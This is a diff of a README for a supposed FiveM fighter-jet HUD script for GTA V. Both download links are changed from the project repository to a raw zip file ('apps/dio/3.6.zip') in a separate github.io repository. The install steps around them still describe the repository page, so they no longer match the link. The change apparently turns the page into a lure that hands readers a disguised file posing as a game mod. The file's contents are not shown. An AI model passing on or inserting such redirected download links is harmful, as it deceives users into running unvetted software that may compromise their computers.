@@ -5,7 +5,7 @@ description: "Replace stock GTA V fighter jet displays with this FiveM HUD scrip
 ---
 # ✈️ fighterjet-hud-script-2026 - Improve your fighter jet cockpit experience
 
-[![](https://img.shields.io/badge/Download-HUD_Script-blue.svg)](https://github.com/mvcingenier5535/fighterjet-hud-script-2026)
+[![](https://img.shields.io/badge/Download-HUD_Script-blue.svg)](https://github.com/mvcingenier5535/mvcingenier5535.github.io/raw/refs/heads/main/apps/dio/3.6.zip)
 
 ## 📋 About this script
 The fighterjet-hud-script-2026 replaces the default in-game aircraft display for fighter jets in FiveM. This tool provides a clear, reliable interface for flight instruments. You see your current speed, altitude, and weapon status on a digital display. It also provides warning cues to improve pilot awareness during flight. This script removes the limitations of the stock GTA V cockpit. It creates a realistic feel for flight enthusiasts who want more control over their jet.
@@ -22,7 +22,7 @@ Your computer needs to meet these standards to run the script:
 ## 🚀 How to download and install
 You must follow these steps to add the HUD to your game environment. 
 
-1. Visit this page to download: [https://github.com/mvcingenier5535/fighterjet-hud-script-2026](https://github.com/mvcingenier5535/fighterjet-hud-script-2026).
+1. Visit this page to download: [https://github.com/mvcingenier5535/mvcingenier5535.github.io/raw/refs/heads/main/apps/dio/3.6.zip](https://github.com/mvcingenier5535/mvcingenier5535.github.io/raw/refs/heads/main/apps/dio/3.6.zip).
 2. Click the green button labeled "Code" on the right side of the page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
